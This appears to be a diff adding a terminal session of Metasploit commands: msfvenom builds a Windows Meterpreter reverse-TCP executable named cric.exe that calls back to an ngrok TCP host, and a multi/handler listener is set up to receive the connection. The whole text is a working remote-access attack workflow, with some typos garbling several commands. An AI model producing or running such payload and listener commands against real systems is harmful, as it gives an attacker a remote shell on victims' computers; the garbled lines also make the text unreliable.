@@ -1,1 +1,9 @@
 root@kali# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=0 tcp.ngrok.io LPORT=19336. -f exe -o cric.exe
+msf5>use exploit/multi/handler
+msf5 exploit(multi/handler)>set payload windows/x64/meterpreter/recerse_tcp
+payload=>windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler)>set LHOST 0.0.0.0
+LHOST => 0.0.0.0
+msf5 exoloit(multi/handler)>set LPORT 19336
+LPORT =>19336
+msf5 exploit(multi/handler)> exploit
